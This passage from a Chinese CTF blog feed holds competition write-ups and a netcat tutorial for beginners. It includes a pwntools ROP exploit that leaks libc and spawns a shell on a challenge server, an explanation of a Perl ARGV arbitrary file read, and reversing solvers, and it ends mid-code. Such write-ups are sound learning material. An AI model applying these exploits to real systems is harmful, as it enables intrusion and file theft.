)(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(¬_¬&quot;)(￣﹏￣；)(╯°□°）╯︵ ┻━┻ヽ(゜▽゜　)－C&lt;(&#x2F;;◇;)&#x2F;~(ヘ･_･)ヘ┳━┳ಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃⊙﹏⊙∥ヽ(*。&gt;Д&lt;)o゜&#x2F;(ㄒoㄒ)&#x2F;~~(#_&lt;-)（＞人＜；）(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••flag被我炸没了哈哈哈</code></pre><p>空格和base64加密的颜文字</p><p>stegsnow解出现乱码</p><p>拿颜文字的base64跑base64隐写，得到秘钥<code>lorrie</code></p><p>连到自己的服务器上nc保存文件</p><img src="/article/2020hxb-Writeup-cOMING/24f08c5af60b185a313ee1463c9a4852.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/113c837089faeae4e4cbf169b26103f2.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/a6cd84af9e66703249e6d040b8378d79.png" class="" loading="lazy"><p><code>→_→</code>替换为<code>-</code>,<code>←_←</code>替换为<code>.</code>,去网站上解码</p><img src="/article/2020hxb-Writeup-cOMING/4be4b33a5bdc0c72d555bcf347fc81dd.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/f9ede18047cccbfc556a9c345a0beac0.png" class="" loading="lazy"><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="古典美"><a href="#古典美" class="headerlink" title="古典美++"></a>古典美++</h3><p>利用网站工具得维吉尼亚密码密钥</p><img src="/article/2020hxb-Writeup-cOMING/7623653b8d5fa7474f7a021105bcc064.png" class="" loading="lazy"><p>为<code>orderby</code> 生成MD5</p><img src="/article/2020hxb-Writeup-cOMING/5ac8fcc0d5536abdee804959d8a3c242.png" class="" loading="lazy"><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h3><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *from LibcSearcher import *context.log_level &#x3D; &#39;debug&#39;context.terminal&#x3D;[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]p &#x3D; remote(&#39;47.111.96.55&#39;,54606)elf &#x3D; ELF(&#39;.&#x2F;pwn_printf&#39;)read_plt &#x3D; elf.symbols[&#39;read&#39;]read_got &#x3D; elf.got[&#39;read&#39;]puts_plt &#x3D; elf.symbols[&#39;puts&#39;]puts_got &#x3D; elf.got[&#39;puts&#39;]pop_rdi &#x3D; 0x401213v_addr &#x3D; 0x4007C6scanf &#x3D; 0x4006A0pop_rsi_ret &#x3D; 0x401211p.recvuntil(&quot;You will find this game very interesting&quot;)for i in range(16):    p.sendline(&quot;32&quot;)payload1 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(v_addr)p.sendline(payload1)p.recvline()rrr &#x3D; p.recv(6)puts_addr &#x3D; u64(rrr.ljust(8,b&#39;\x00&#39;))print (hex(puts_addr))wri &#x3D; 0x06030A0payload2 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(0x0401D99 ) +p64(pop_rsi_ret) +p64(wri)+p64(0)+ p64(scanf) + p64(pop_rdi) + p64(8*4 )+ p64(v_addr+1)p.recv()n1 &#x3D; int(b&#39;&#x2F;bin&#39;[::-1].hex(),16)n2 &#x3D; int(b&#39;&#x2F;sh\x00&#39;[::-1].hex(),16)p.sendline(payload2)print(&quot;n1:&quot; + str(n1))sleep(0.3)p.sendline(str(n1))wri &#x3D; 0x06030A0+4sleep(0.5)payload2 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(wri) + p64(0) + p64(scanf) + p64(v_addr)p.send(payload2)p.sendline(str(n2))payload3 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x06030A0) + p64(puts_addr-0x2a300)sleep(0.5)p.sendline(payload3)p.interactive()</code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>爆破，逐个击破。。。</p><p>easy_c++</p><p>IDA分析 一个信息</p><img src="/article/2020hxb-Writeup-cOMING/61a2caae7f31cbfc365432119425d6fd.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/565ff985b4b771d98409ec3233eb8309.png" class="" loading="lazy"><p>长度32</p><img src="/article/2020hxb-Writeup-cOMING/17aa83fa3a88db01f27c8fb3d41c5e5f.png" class="" loading="lazy"><p>exp：</p><pre class="language-none"><code class="language-none">public class Test &#123;    public static void main(String[] args) &#123;        String a &#x3D; &quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;;        char v11;        int v13;        for (int i &#x3D;0; i&lt;32; i++)        &#123;            v11 &#x3D; a.charAt(i);            v13 &#x3D; i ^ (int)v11;            System.out.print((char)v13);        &#125;    &#125;&#125;</code></pre><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>反编译py</p><pre class="language-none"><code class="language-none">python3 pyinstxtractor.py ReMe.exe</code></pre><img src="/article/2020hxb-Writeup-cOMING/1393ddb113bda2babe004c8a7bd44c13.png" class="" loading="lazy"><p>010打开</p><img src="/article/2020hxb-Writeup-cOMING/38a8bb796f44edf49bb8ec9ae28a850c.png" class="" loading="lazy"><p>置换之后：</p><img src="/article/2020hxb-Writeup-cOMING/0b91b5d7322cfcb630981982098feea8.png" class="" loading="lazy"><p>改后缀：ReMe.pyc</p><pre class="language-none"><code class="language-none">uncompyle6 ReMe.pycλ uncompyle6 ReMe.pyc# uncompyle6 version 3.7.4# Python bytecode 3.7 (3394)# Decompiled from: Python 3.8.5 (tags&#x2F;v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]# Embedded file name: ReMe.py# Compiled at: 1995-09-28 00:18:56# Size of source mod 2**32: 272 bytesimport sys, hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(num):    result &#x3D; []    while num !&#x3D; 1:        num &#x3D; num * 3 + 1 if num % 2 else num &#x2F;&#x2F; 2        result.append(num)    return resultif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    print(&#39;Your input is not the FLAG!&#39;)    inp &#x3D; input()    if len(inp) !&#x3D; 27:        print(&#39;length error!&#39;)        sys.exit(-1)    for i, ch in enumerate(inp):        ret_list &#x3D; func(ord(ch))        s &#x3D; &#39;&#39;        for idx in range(len(ret_list)):            s +&#x3D; str(ret_list[idx])            s +&#x3D; str(ret_list[(len(ret_list) - idx - 1)])        md5 &#x3D; hashlib.md5()        md5.update(s.encode(&#39;utf-8&#39;))        if md5.hexdigest() !&#x3D; check[i]:            sys.exit(i)    md5 &#x3D; hashlib.md5()    md5.update(inp.encode(&#39;utf-8&#39;))    print(&#39;You win!&#39;)    print(&#39;flag&#123;&#39; + md5.hexdigest() + &#39;&#125;&#39;)# okay decompiling ReMe.pyc</code></pre><p>exp:</p><pre class="language-none"><code class="language-none">import hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(number):    ret &#x3D; []    while number !&#x3D; 1:        number &#x3D; number * 3 + 1 if number % 2 else number &#x2F;&#x2F; 2        ret.append(number)    return retfor i in range(1,128):    a &#x3D; func(i)    ans &#x3D; &quot;&quot;    for j in range(len(a)):        ans +&#x3D; str(a[j])        ans +&#x3D; str(a[(len(a) - j - 1)])    md5 &#x3D; hashlib.md5()    md5.update(ans.encode(&#39;utf-8&#39;))    b &#x3D; md5.hexdigest()    for j in range(27):        if b &#x3D;&#x3D; check[j]:            print chr(i),j</code></pre><p>跑出 flag{My_M@th_3X+1_R3v_Te5t} 再跑md5</p><img src="/article/2020hxb-Writeup-cOMING/ac2500682b8e1112e9a89ce1b1f97465.png" class="" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netcat 网络测试工具</title>
      <link href="article/Netcat/"/>
      <url>article/Netcat/</url>
      
        <content type="html"><![CDATA[<h2 id="这里是中国科技大学-taoky-写的一篇文章-nc是什么"><a href="#这里是中国科技大学-taoky-写的一篇文章-nc是什么" class="headerlink" title="这里是中国科技大学@taoky 写的一篇文章: nc是什么?"></a><strong>这里是中国科技大学@taoky 写的一篇文章: nc是什么?</strong></h2><p>请仔细阅读，一般二进制bin方向可能用到nc的地方会很多。</p><hr><p>nc&#x2F;ncat 是 netcat 的缩写，它可以读写 TCP 与 UDP 端口——或许你看不懂这句话，这没有关系。简单地说，它可以在字符界面下，让你和服务器沟通交流。<br>一般来说，有很多题目都会要求你使用 nc 连接到他们的服务器，并且进行交互，获得 flag</p><h2 id="如何安装-nc？"><a href="#如何安装-nc？" class="headerlink" title="如何安装 nc？"></a>如何安装 nc？</h2><p><code>nc</code> 命令在 macOS 中是自带的，在 Linux 中一般自带，或是可以使用相应的软件包管理器安装（如在 Debian&#x2F;Ubuntu 中这个包名叫 netcat）。</p><p>当然，如果你在看这篇手册，你的操作系统很有可能是 Windows。它不自带 <code>nc</code>，尽管可以用 WSL 或者虚拟机的方式解决，但是如果你觉得这样太麻烦了，也有另外一些方法。</p><h3 id="使用静态链接的-ncat-程序"><a href="#使用静态链接的-ncat-程序" class="headerlink" title="使用静态链接的 ncat 程序"></a>使用静态链接的 ncat 程序</h3><p>前往 <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">此处</a> (github链接)下载此程序。我们也在这里提供了一份。下载下来即可。</p><p><a href="/download/ncat.zip">ncat.zip</a></p><blockquote><p>注：nc&#x2F;ncat 事实上是两个不同的程序，但在我们接下来的使用上，基本没有区别。ncat 是由 Nmap 项目开发的“重置版的 Netcat”。</p></blockquote><h4 id="Q-我的杀毒软件报毒怎么办"><a href="#Q-我的杀毒软件报毒怎么办" class="headerlink" title="Q:我的杀毒软件报毒怎么办"></a>Q:我的杀毒软件报毒怎么办</h4><p>如果你不相信此来源，也可以下载 nmap（一个网络探测、扫描工具），它会附带一个 ncat。</p><h2 id="如何使用-nc"><a href="#如何使用-nc" class="headerlink" title="如何使用 nc?"></a>如何使用 nc?</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>直接双击，你会看到一个窗口一扫而过——这是正常现象。你需要使用「命令提示符」或者「PowerShell」来访问这个程序。</p><p>Windows 10 中，你可以使用资源管理器 -&gt; 文件来在你存放 nc 的目录中打开命令提示符或 PowerShell。</p><img src="/article/Netcat/explorer-1024x510.png" class="" loading="lazy"><h6 id="在-Windows-资源管理器中打开命令提示符或-PowerShell"><a href="#在-Windows-资源管理器中打开命令提示符或-PowerShell" class="headerlink" title="在 Windows 资源管理器中打开命令提示符或 PowerShell"></a>在 Windows 资源管理器中打开命令提示符或 PowerShell</h6><p>可以直接在<code>ncat.exe</code>所在目录，按住<code>Shift+鼠标右键</code>点击<code>在此处打开Powershell窗口</code>输入<code>ncat</code></p><p>或者，你也可以在开始菜单 -&gt; Windows 系统中打开命令提示符，或者在开始菜单 -&gt; Windows PowerShell 中打开 PowerShell，也可以按住<code>win标+R</code>弹出<code>运行</code>窗口输入<code>cmd</code>，然后使用 cd 命令转移到对应的目录：输入 cd 文件夹名 可以让你转移到对应的文件夹，输入 cd .. 可以让你转移到上面一层目录。使用 dir 命令，可以显示当前目录下所有文件。同时，使用 Tab 键可以帮助你补全名称。</p><p>当跳转到你存放 nc 的文件夹后：</p><ul><li>如果你使用的是 PowerShell（蓝色背景），输入 .&#x2F;ncat（根据 nc 对应的名称不同而不同）。</li><li>如果你使用的是命令提示符（黑色背景），输入 ncat（根据 nc 对应的名称不同而不同）。</li></ul><p>当显示以下内容时，说明你成功运行了它。</p><img src="/article/Netcat/image-20210220172523253.png" class="" title="nc" loading="lazy"><h6 id="成功运行-ncat"><a href="#成功运行-ncat" class="headerlink" title="成功运行 ncat"></a>成功运行 ncat</h6><h3 id="Linux-amp-macOS"><a href="#Linux-amp-macOS" class="headerlink" title="Linux &amp; macOS"></a>Linux &amp; macOS</h3><p>打开「终端」，输入 <code>nc</code>。</p><pre class="language-none"><code class="language-none">$ ncusage: nc [-46AacCDdEFhklMnOortUuvz] [-K tc] [-b boundif] [-i interval] [-p source_port] [--apple-delegate-pid pid] [--apple-delegate-uuid uuid]  [-s source_ip_address] [-w timeout] [-X proxy_version]  [-x proxy_address[:port]] [hostname] [port[s]]</code></pre><p>出现了类似上面的输出，说明运行成功了。</p><img src="/article/Netcat/image-20210220170815879.png" class="" title="image-20210220170815879" loading="lazy"><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>在我们使用浏览器上网的时候，我们和服务器使用了 HTTP 协议进行连接。关于 HTTP 协议的更多细节，你需要自己上网搜索。一般来说，默认是 80 端口。</p><p>我们可以使用 nc，尝试一次与网页服务器的连接，以百度为例。</p><p>输入 <code>nc www.baidu.com 80</code>（或者 <code>ncat www.baidu.com 80</code>，或者 <code>./ncat www.baidu.com 80</code>，请根据以上的介绍自行修改），程序会等待你的输入。</p><p>输入 GET &#x2F; HTTP&#x2F;1.0。这表示，我们使用 HTTP&#x2F;1.0 这个协议版本，用 GET 的方式请求根 &#x2F;。输入<strong>两下</strong>回车，代表我们的 HTTP 请求完成。如果你的网络畅通，百度的网页服务器会立刻返回大量信息，可以自行搜索，了解它们的含义。现在，你成功（在不使用浏览器的情况下）完成了一次与百度网站的连接！</p><img src="/article/Netcat/image-20210220172713535.png" class="" title="nc success" loading="lazy"><h6 id="内容可能不同，返回类似即表示成功"><a href="#内容可能不同，返回类似即表示成功" class="headerlink" title="内容可能不同，返回类似即表示成功"></a>内容可能不同，返回类似即表示成功</h6><p>如果你成功了，那么你可以开始愉快地完成我们的题目了！</p><hr><p>end</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 菜鸡教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj WEB Write-up</title>
      <link href="article/Buuoj-WEB-Write-up/"/>
      <url>article/Buuoj-WEB-Write-up/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><p>刷题，buuoj记录</p><span id="more"></span><hr><h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129165730787.png" class="" title="image-20201129165730787" loading="lazy"><p>咱也不懂perl…</p><p>发现了文件上传的地方</p><img src="/article/Buuoj-WEB-Write-up/image-20201129165825648.png" class="" title="image-20201129165825648" loading="lazy"><p>发现会把上传的文件直接显示在网页上</p><p>查了下原理</p><h5 id="perlparam-任意文件读取"><a href="#perlparam-任意文件读取" class="headerlink" title="perlparam()任意文件读取"></a>perlparam()任意文件读取</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cgi</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name type-declaration">my</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$file</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span>        <span class="token keyword">print</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p> 如上代码将上传的文件原样输出到网页 </p><p>知识点： param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。 </p><p>ARGV——命令行参数</p><p>于是抓包</p><img src="/article/Buuoj-WEB-Write-up/image-20201129170225902.png" class="" title="image-20201129170225902" loading="lazy"><p>修改为：</p><img src="/article/Buuoj-WEB-Write-up/image-20201129170548925.png" class="" title="image-20201129170548925" loading="lazy"><hr><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129170732360.png" class="" title="image-20201129170732360" loading="lazy"><p>source code</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span><span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event    <span class="token keyword">else</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystack<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid_event_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>            <span class="token keyword">if</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token 